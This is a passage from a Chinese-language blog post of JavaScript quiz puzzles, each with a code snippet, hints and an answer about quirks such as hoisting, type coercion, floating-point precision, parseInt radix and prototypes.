class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> name = <span class="string">'World!'</span>;</div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">'undefined'</span>) &#123;</div><div class="line">        <span class="keyword">var</span> name = <span class="string">'Jack'</span>;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Goodbye '</span> + name);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + name);</div><div class="line">    &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>typeof</code>时 <code>name</code> 变量提升。 在函数内部声明没有定义<br>2、 <code>typeof</code> 优先级高于 <code>===</code><br>答案：<code>Goodbye Jack</code></p><h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var END = Math.pow(<span class="number">2</span>, <span class="number">53</span>)<span class="comment">;</span></div><div class="line">var START = END - <span class="number">100</span><span class="comment">;</span></div><div class="line">var <span class="built_in">count</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">for (var i = START<span class="comment">; i &lt;= END; i++) &#123;</span></div><div class="line">    <span class="built_in">count</span>++<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">console.log(<span class="built_in">count</span>)<span class="comment">;</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、js中可以表示的最大整数不是2的53次方，而是<code>1.7976931348623157e+308</code>。2的53次方不是js能表示的最大整数而应该是能正确计算且不失精度的最大整数，<br>2、<code>count</code> 就会陷入无限循环<br>答案：other ,不是101</p><h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ary = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>];</div><div class="line">ary[<span class="number">10</span>] = <span class="number">10</span>;</div><div class="line">ary.filter(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> x === <span class="literal">undefined</span>;&#125;);</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>filter()</code> 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。<br>2、 <code>filter()</code> 不会对空数组进行检测。<br>3、 <code>filter()</code> 不会改变原始数组。<br>4、 <code>Array.prototype.filter</code> 不会对空数组进行检测。会跳过那些空元素<br>答案：<code>[]</code></p><h2 id="八"><a href="#八" class="headerlink" title="八"></a>八</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> <span class="keyword">two</span>   = 0.2</div><div class="line"><span class="keyword">var</span> <span class="keyword">one</span>   = 0.1</div><div class="line"><span class="keyword">var</span> eight = 0.8</div><div class="line"><span class="keyword">var</span> six   = 0.6</div><div class="line">[<span class="keyword">two</span> - <span class="keyword">one</span> == <span class="keyword">one</span>, eight - six == <span class="keyword">two</span>]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、IEEE 754标准中的浮点数并不能精确地表达小数<br>2、 2 1 8 6 就是 true true<br>3、 <code>( eight - six ).toFixed(4) == two</code> // true<br>答案：<code>[true, false]</code></p><h2 id="九"><a href="#九" class="headerlink" title="九"></a>九</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCase</span>(<span class="params">value</span>) </span>&#123;</div><div class="line">    <span class="keyword">switch</span>(value) &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'A'</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Case A'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'B'</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Case B'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="literal">undefined</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'undefined'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Do not know!'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">showCase(<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'A'</span>));</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>switch</code> 内部使用严格相等 <code>===</code><br>2、<code>new String(x) !== x</code>; <code>new String(x)</code> 是个对象啊！<br>答案：<code>Do not know!</code></p><h2 id="十"><a href="#十" class="headerlink" title="十"></a>十</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCase2</span>(<span class="params">value</span>) </span>&#123;</div><div class="line">    <span class="keyword">switch</span>(value) &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'A'</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Case A'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'B'</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Case B'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="literal">undefined</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'undefined'</span>);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Do not know!'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">showCase2(<span class="built_in">String</span>(<span class="string">'A'</span>));</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>typeof String(&#39;A&#39;) === &quot;string&quot;</code><br>答案：<code>Case A</code></p><h2 id="十一"><a href="#十一" class="headerlink" title="十一"></a>十一</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isOdd</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> num % <span class="number">2</span> == <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEven</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> num % <span class="number">2</span> == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isSane</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> isEven(num) || isOdd(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> values = [<span class="number">7</span>, <span class="number">4</span>, <span class="string">'13'</span>, <span class="number">-9</span>, <span class="literal">Infinity</span>];</div><div class="line">values.map(isSane);</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 字符串 ‘13’ 也可以地板除！<br>2、 -9 保留符号地板除<br>3、 <code>Infinity % 2 为 NaN</code><br>4、 <code>%</code> 如果不是数值会调用 <code>Number()</code>去转化<br>5、  <code>9 % -2</code>  // 1   余数的正负号随第一个操作数<br>答案：[true, true, true, false, false]</p><h2 id="十二"><a href="#十二" class="headerlink" title="十二"></a>十二</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">3</span>, <span class="number">8</span>)</span></span></div><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">3</span>, <span class="number">2</span>)</span></span></div><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="number">3</span>, <span class="number">0</span>)</span></span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、8进制里3就是3<br>2、2进制里没有3<br>3、0进制就是10进制，10 进制里3就是3<br>答案：<code>3  NaN  3</code></p><h2 id="十三"><a href="#十三" class="headerlink" title="十三"></a>十三</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Array</span>.<span class="built_in">isArray</span>( <span class="built_in">Array</span>.prototype )</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Array.prototype</code> 是一个数组<br>2、  数组的原型是数组，对象的原型是对象，函数的原型是函数<br>答案：true</p><h2 id="十四"><a href="#十四" class="headerlink" title="十四"></a>十四</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = [<span class="number">0</span>];</div><div class="line"><span class="keyword">if</span> ([<span class="number">0</span>]) &#123;</div><div class="line">  <span class="built_in">console</span>.log(a == <span class="literal">true</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"wut"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>[0]</code> 作为布尔值是 true<br>2、但是题目中是比较 <code>[0]</code> 和 <code>true</code> 是否一样<br>3、当然不一样啦！<br>答案：false</p><h2 id="十五"><a href="#十五" class="headerlink" title="十五"></a>十五</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[]</span>==<span class="string">[]</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、两个引用类型， ==比较的是引用地址<br>答案：false</p><h2 id="十六"><a href="#十六" class="headerlink" title="十六"></a>十六</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">'<span class="number">5</span>' + <span class="number">3</span></div><div class="line">'<span class="number">5</span>' - <span class="number">3</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、加号有拼接功能，减号就是逻辑运算<br>答案：53  2</p><h2 id="十七"><a href="#十七" class="headerlink" title="十七"></a>十七</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">1 </span>+ - + + + - + <span class="number">1</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、+-又是一元加和减操作符号，就是数学里的正负号。负负得正哈。<br>答案：2</p><h2 id="十八"><a href="#十八" class="headerlink" title="十八"></a>十八</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ary = <span class="built_in">Array</span>(<span class="number">3</span>);</div><div class="line">ary[<span class="number">0</span>]=<span class="number">2</span></div><div class="line">ary.map(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>) </span>&#123; <span class="keyword">return</span> <span class="string">'1'</span>; &#125;);</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Array</code> 里有 3 个元素<br>2、 <code>map</code> 映射前：第一元素是2，第二个是 <code>undefined</code>, 第三个是 <code>undefined</code><br>3、 <code>map</code> 映射后：第一元素是1，第二个是 <code>undefined</code>, 第三个是 <code>undefined</code><br>4、 因为 <code>map</code> 只映射初始化过的变量<br>答案：<code>[&quot;1&quot;, empty × 2]</code></p><h2 id="十九"><a href="#十九" class="headerlink" title="十九"></a>十九</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sidEffecting</span>(<span class="params">ary</span>) </span>&#123;</div><div class="line">  ary[<span class="number">0</span>] = ary[<span class="number">2</span>];</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">a,b,c</span>) </span>&#123;</div><div class="line">  c = <span class="number">10</span></div><div class="line">  sidEffecting(<span class="built_in">arguments</span>);</div><div class="line">  <span class="keyword">return</span> a + b + c;</div><div class="line">&#125;</div><div class="line">bar(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>arguments</code> 会和函数参数绑定。<br>2、 严格模式 <code>arguments</code> 对象是传入函数内实参列表的静态副本；非严格模式下，指向同一个值的引用<br>3、 严格模式变量必须先声明，才能使用<br>4、 严格模式中 <code>call</code> <code>apply</code> 传入 <code>null</code> <code>undefined</code> 保持原样不被转换为 <code>window</code><br>答案：21</p><h2 id="二十"><a href="#二十" class="headerlink" title="二十"></a>二十</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a = <span class="number">111111111111111110000</span>,</div><div class="line">    b = <span class="number">1111</span>;</div><div class="line">a + b;</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、在 JavaScript 中 <code>number</code> 类型在JavaScript中以64位（8byte）来存储。这64位中有符号位1位、指数位11位、实数位52位。2的53次方时，是最大值。其值为：9007199254740992（0x20000000000000）。超过这个值的话，运算的结果就会不对.<br>答案：11111111111111111000 // 和 a 一样</p><h2 id="二十一"><a href="#二十一" class="headerlink" title="二十一"></a>二十一</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var x = [].reverse<span class="comment">;</span></div><div class="line">x()<span class="comment">;</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>[].reverse</code> 会返回 <code>this</code>，此时的 <code>this</code> 指向 <code>window</code><br>2、 <code>x = [].reverse</code> 是把<code>reverse函数</code>赋值给 <code>x</code> ，<code>reverse函数</code> 处理的是调用它的 <code>this</code>，比如 <code>[1,2,3].reverse()</code>时，它的 <code>this</code> 是 <code>[1,2,3]</code>，以前 <code>reverse</code> 是非严格模式的函数下，没传 <code>this</code> 会默认为 <code>window</code>，现在的 <code>reverse</code> 使用严格模式编写,应该是 <code>undefined</code>，所以会报类型转换错误<br>答案：error</p><h2 id="二十二"><a href="#二十二" class="headerlink" title="二十二"></a>二十二</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Number<span class="selector-class">.MIN_VALUE</span> &gt; <span class="number">0</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Number.MIN_VALUE</code> 属性表示在 <code>JavaScript</code> 中所能表示的最小的正值。<br>答案：true</p><h2 id="二十三"><a href="#二十三" class="headerlink" title="二十三"></a>二十三</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span> &lt; <span class="number">2</span> &lt; <span class="number">3</span>, <span class="number">3</span> &lt; <span class="number">2</span> &lt; <span class="number">1</span>]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>1 &lt; 2    =&gt;  true;</code><br>2、 <code>true &lt; 3 =&gt;  1 &lt; 3 =&gt; true;</code><br>3、 <code>3 &lt; 2    =&gt; false;</code><br>4、 <code>false &lt; 1 =&gt; 0 &lt; 1 =&gt; true;</code><br>答案：<code>[true,true]</code>   </p><h2 id="二十四"><a href="#二十四" class="headerlink" title="二十四"></a>二十四</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// the most classic wtf</span></div><div class="line"><span class="number">2</span> == [[[<span class="number">2</span>]]]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、值和引用类型去比较,把引用类型转话成值类型<br>2、推荐一篇[]有关的 <a href="https://stackoverflow.com/questions/7202157/why-does-return-the-string-10/7202287#7202287" target="_blank" rel="external">stackoverflow</a><br>答案：<code>true</code></p><h2 id="二十五"><a href="#二十五" class="headerlink" title="二十五"></a>二十五</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">3<span class="selector-class">.toString</span>()</div><div class="line">3.<span class="selector-class">.toString</span>()</div><div class="line">3..<span class="selector-class">.toString</span>()</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>toString()</code> 返回字符串，用法为 <code>object.toString()</code><br>2、 <code>3.</code> 代表的是 <code>3</code> 和 3的小数位<br>3、 所以有两个点竟然是合理的<br>4、 在 js 中 1.1, 1., .1 都是合法的数字<br>答案：<code>error, &quot;3&quot;, error</code></p><h2 id="二十六"><a href="#二十六" class="headerlink" title="二十六"></a>二十六</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> x = y = <span class="number">1</span>;</div><div class="line">&#125;)();</div><div class="line"><span class="built_in">console</span>.log(y);</div><div class="line"><span class="built_in">console</span>.log(x);</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 y 是全局变量<br>2、 x 是局部变量<br>答案：<code>1, error</code></p><h2 id="二十七"><a href="#二十七" class="headerlink" title="二十七"></a>二十七</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var <span class="attr">a</span> = /<span class="number">123</span>/,</div><div class="line">    <span class="attr">b</span> = /<span class="number">123</span>/;</div><div class="line"><span class="attr">a</span> == b</div><div class="line"><span class="attr">a</span> === b</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 这是两个正则啊！<br>2、 正则是对象，引用类型，相等 <code>==</code> 和全等 <code>===</code> 都是比较引用地址<br>答案：<code>false, false</code></p><h2 id="二十八"><a href="#二十八" class="headerlink" title="二十八"></a>二十八</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">    b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">    c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</div><div class="line">a ==  b</div><div class="line">a === b</div><div class="line">a &gt;   c</div><div class="line">a &lt;   c</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 数组只用 <code>大于&gt;</code> 和 <code>小于&lt;</code> 做比较，不用等号<br>2、 相等（<code>==</code>）和全等（<code>===</code>）还是比较引用地址<br>3、 引用类型间比较大小是按照字典序比较，就是先比第一项谁大，相同再去比第二项。<br>答案：<code>false, false, false, true</code></p><h2 id="二十九"><a href="#二十九" class="headerlink" title="二十九"></a>二十九</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">var</span> a = &#123;&#125;, b = <span class="type">Object</span>.proto<span class="keyword">type</span>;</div><div class="line">[a.proto<span class="keyword">type</span> === b, <span class="type">Object</span>.getPrototypeOf(a) === b]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Functions</code>有 <code>prototype</code>，但是其他对象却没有；<br>2、 <code>a.prototype</code> 是 <code>undefined</code>.<br>3、 每个 <code>Object</code> 都内置了 <code>getPrototypeOf</code><br>4、 <code>Object</code> 的实例是 <code>a</code>，<code>a</code> 上并没有 <code>prototype</code> 属性<br>5、 <code>a</code> 的 <code>__poroto__</code>  指向的是 <code>Object.prototype</code>，也就是 <code>Object.getPrototypeOf(a)</code>。 <code>a</code> 的原型对象是 <code>b</code><br>答案：<code>false, true</code></p><h2 id="三十"><a href="#三十" class="headerlink" title="三十"></a>三十</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"><span class="keyword">var</span> a = f.prototype, b = <span class="built_in">Object</span>.getPrototypeOf(f);</div><div class="line">a === b</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 a是构造函数f的原型 ： <code>{constructor: ƒ}</code><br>2、 b是实例f的原型对象 ： <code>ƒ () { [native code] }</code><br>答案：false</p><h2 id="三十一"><a href="#三十一" class="headerlink" title="三十一"></a>三十一</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; &#125;</div><div class="line"><span class="keyword">var</span> oldName = foo.name;</div><div class="line">foo.name = <span class="string">"bar"</span>;</div><div class="line">[oldName, foo.name]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 函数的名字不可变<br>答案：<code>[&quot;foo&quot;, &quot;foo&quot;]</code></p><h2 id="三十二"><a href="#三十二" class="headerlink" title="三十二"></a>三十二</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"1 2 3"</span>.replace(<span class="regexp">/\d/g</span>, <span class="built_in">parseInt</span>)</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 replace（旧，新）<br>2、 <code>/\d/g</code> 全局匹配 数字0-9<br>3、 如果replace函数传入的第二个参数是函数, 那么这个函数将接受如下参数：<br>match 首先是匹配的字符串<br>p1, p2 …. 然后是正则的分组<br>offset match 匹配的index<br>string 整个字符串<br>由于题目中的正则没有分组, 所以等价于问：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="string">'1'</span>, <span class="number">0</span>)</span></span></div><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="string">'2'</span>, <span class="number">2</span>)</span></span></div><div class="line"><span class="function"><span class="title">parseInt</span><span class="params">(<span class="string">'3'</span>, <span class="number">4</span>)</span></span></div></pre></td></tr></table></figure></p><p>答案：<code>&quot;1 NaN 3&quot;</code></p><h2 id="三十三"><a href="#三十三" class="headerlink" title="三十三"></a>三十三</h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"><span class="built_in">var</span> <span class="built_in">parent</span> = <span class="built_in">Object</span>.getPrototypeOf(f);</div><div class="line">f.name <span class="comment">// "f"</span></div><div class="line"><span class="built_in">parent</span>.name <span class="comment">// "empty"</span></div><div class="line"><span class="keyword">typeof</span> <span class="built_in">eval</span>(f.name) <span class="comment">// "function"</span></div><div class="line"><span class="keyword">typeof</span> <span class="built_in">eval</span>(<span class="built_in">parent</span>.name) <span class="comment">// error</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 函数的原型在某处被定义了，它有名字，它可以被调用，但就是不在现在的范围内<br>2、 f 的函数名就是 f<br>3、 <code>parent === Function.prototype</code><br>答案：<code>&quot;f&quot;, &quot;Empty&quot;, &quot;function&quot;, error</code></p><h2 id="三十四"><a href="#三十四" class="headerlink" title="三十四"></a>三十四</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> lowerCaseOnly =  <span class="regexp">/^[a-z]+$/</span>;</div><div class="line">[lowerCaseOnly.test(<span class="literal">null</span>), lowerCaseOnly.test()]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>^</code> 开始， <code>+</code> 匹配前面一个表达式1次或者多次，<code>$</code> 结束<br>2、 <code>test()</code> 方法用于检测一个字符串是否匹配某个模式<br>3、 参数被转换成字符串了，所以当然有 <code>null</code> 和 <code>undefined</code><br>答案：<code>[true, true]</code></p><h2 id="三十五"><a href="#三十五" class="headerlink" title="三十五"></a>三十五</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[,,,]</span><span class="selector-class">.join</span>(<span class="string">", "</span>)</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>join()</code> 方法用于把数组中的所有元素放入一个字符串<br>2、 因为javascript 在定义数组的时候允许最后一个元素后跟一个,所以这个数组长度是3<br>3、 答案：<code>&quot;,, &quot;</code>。（神奇）</p><h2 id="三十六"><a href="#三十六" class="headerlink" title="三十六"></a>三十六</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = &#123;<span class="class"><span class="keyword">class</span>: <span class="type">"Animal"</span>, <span class="type">name: 'Fido'&#125;;</span></span></div><div class="line">a.<span class="keyword">class</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 class 是一个类名，作为保留字，浏览器认为它是属性名</p><h2 id="三十七"><a href="#三十七" class="headerlink" title="三十七"></a>三十七</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = new Date(<span class="string">"epoch"</span>)</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 得到的是“无效日期”，这是一个实际的日期对象，但是它是无效的，因为时间内部保存为一个数字<br>2、 简单来说, 如果调用 <code>Date</code> 的构造函数传入一个字符串的话需要符合规范, 即满足 Date.parse 的条件.<br>3、 另外需要注意的是 如果格式错误 构造函数返回的仍是一个 <code>Date</code> 的实例 <code>Invalid Date</code>.<br>4、 正确的格式为：<code>var d = new Date(year, month, day, hours, minutes, seconds, milliseconds);</code><br>答案 <code>Invalid Date</code></p><h2 id="三十八"><a href="#三十八" class="headerlink" title="三十八"></a>三十八</h2><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a = <span class="function"><span class="keyword">Function</span>.<span class="title">length</span></span>,</div><div class="line">    b = new <span class="function"><span class="keyword">Function</span><span class="params">()</span></span>.length</div><div class="line">a === b</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Function.length = 1</code><br>2、 <code>new Function().length = 0</code>，一个 <code>function</code>(Function 的实例) 的 <code>length</code> 属性就是函数签名的参数个数, 所以 <code>b.length == 0</code>.<br>3、 <code>Function.prototype.length = 0</code><br>答案： <code>false</code></p><h2 id="三十九"><a href="#三十九" class="headerlink" title="三十九"></a>三十九</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">Date</span>(<span class="number">0</span>);</div><div class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>);</div><div class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">[a === b, b === c, a === c]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 a 是字符串； 如果是函数调用 返回一个字符串.<br>2、 b 是对象；是引用地址<br>3、 c 是对象；如果不传参数等价于当前时间.<br>答案 <code>false, false, false</code></p><h2 id="四十"><a href="#四十" class="headerlink" title="四十"></a>四十</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var</span> <span class="keyword">min</span> = Math.<span 